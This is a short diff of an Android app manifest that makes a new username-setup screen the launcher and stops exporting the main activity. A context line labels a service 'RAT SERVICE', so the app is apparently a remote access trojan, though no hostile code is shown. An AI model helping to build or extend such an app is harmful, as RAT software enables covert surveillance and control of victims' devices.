@@ -96,19 +96,26 @@
         android:requestLegacyExternalStorage="true"
         tools:targetApi="35">
 
-        <!-- ============ MAIN ACTIVITY ============ -->
+        <!-- ============ SETUP USERNAME ACTIVITY (LAUNCHER) ============ -->
         <activity
-            android:name=".MainActivity"
+            android:name=".SetupUsernameActivity"
             android:exported="true"
             android:launchMode="singleTop"
-            android:excludeFromRecents="false"
-            android:configChanges="orientation|screenSize|keyboardHidden"
             android:screenOrientation="portrait">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+
+        <!-- ============ MAIN ACTIVITY ============ -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="false"
+            android:launchMode="singleTop"
+            android:excludeFromRecents="false"
+            android:configChanges="orientation|screenSize|keyboardHidden"
+            android:screenOrientation="portrait"/>
 
         <!-- ============ RAT SERVICE ============ -->
         <service
